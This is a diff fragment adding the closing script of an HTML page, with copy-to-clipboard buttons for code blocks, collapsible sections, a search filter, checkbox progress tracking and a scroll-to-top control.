+            const codeBlock = button.closest('.code-block');
+            const code = codeBlock.querySelector('code').textContent;
+            
+            navigator.clipboard.writeText(code).then(() => {
+                button.textContent = '✓ Copied!';
+                button.classList.add('copied');
+                
+                setTimeout(() => {
+                    button.textContent = 'Copy';
+                    button.classList.remove('copied');
+                }, 2000);
+            });
+        }
+
+        // Collapsible Sections
+        document.querySelectorAll('.collapsible-header').forEach(header => {
+            header.addEventListener('click', () => {
+                const collapsible = header.closest('.collapsible');
+                collapsible.classList.toggle('open');
+            });
+        });
+
+        // Search Functionality
+        const searchBox = document.getElementById('searchBox');
+        searchBox.addEventListener('input', (e) => {
+            const searchTerm = e.target.value.toLowerCase();
+            const codeBlocks = document.querySelectorAll('.code-block');
+            
+            codeBlocks.forEach(block => {
+                const code = block.textContent.toLowerCase();
+                const card = block.closest('.section-card');
+                
+                if (code.includes(searchTerm)) {
+                    card.style.display = 'block';
+                    block.style.background = searchTerm ? '#2a2a2a' : '#1e1e1e';
+                } else if (searchTerm) {
+                    // Don't hide entire card, just dim it
+                    block.style.opacity = '0.5';
+                } else {
+                    block.style.opacity = '1';
+                }
+            });
+        });
+
+        // Progress Tracking
+        function updateProgress() {
+            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
+            const checked = document.querySelectorAll('input[type="checkbox"]:checked');
+            const progress = (checked.length / checkboxes.length) * 100;
+            document.getElementById('progressFill').style.width = progress + '%';
+        }
+
+        document.querySelectorAll('input[type="checkbox"]').forEach(cb => {
+            cb.addEventListener('change', updateProgress);
+        });
+
+        // Scroll to Top
+        window.addEventListener('scroll', () => {
+            const scrollTop = document.getElementById('scrollTop');
+            if (window.pageYOffset > 300) {
+                scrollTop.classList.add('show');
+            } else {
+                scrollTop.classList.remove('show');
+            }
+        });
+
+        function scrollToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Initialize
+        updateProgress();
+    </script>
+</body>
+</html>
+
